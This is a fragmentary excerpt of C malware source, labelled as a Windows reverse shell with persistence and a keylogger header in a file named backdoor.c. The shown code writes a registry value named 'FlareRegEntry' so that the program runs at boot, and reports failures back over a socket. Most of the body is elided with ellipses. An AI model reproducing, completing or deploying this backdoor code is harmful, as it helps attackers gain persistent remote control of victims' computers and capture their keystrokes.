//Reverse Shell with Persistence Coded in C
//backdoor.c file with keylogger header
...
int bootRun()
{
	...
	if (RegSetValueEx(NewVal, TEXT("FlareRegEntry"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
...
//String Cut to change directory
